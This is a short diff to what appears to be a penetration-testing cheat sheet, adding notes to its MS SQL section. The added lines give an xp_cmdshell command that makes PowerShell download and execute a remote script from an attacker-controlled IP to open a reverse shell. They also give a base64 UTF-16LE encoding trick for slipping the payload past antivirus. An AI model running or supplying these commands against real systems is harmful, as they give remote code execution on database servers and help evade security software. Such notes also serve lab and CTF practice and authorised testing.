@@ -274,6 +274,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 From local Kali machine:
 ```mssqlclient.py $USERNAME:'$PASSWORD'@$RHOST -windows-auth```
 
+If xp_cmdshell is enabled, we can create a reverse shell session right away: ```xp_cmdshell powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.4:6666/shell.ps1\")"```
+
+If shell.ps1 is blocked by AV, try with based64 encoding ```echo "powershell_payload" | iconv -t utf-16le | base64 -w 0```\
+Run with powershell /enc\
+Or just find a different powershell TCP payload.
 
 ## Capture Windows Auth Hash via Responder (while on a MS SQL console)
 From local Kali machine, set up a smbserver:
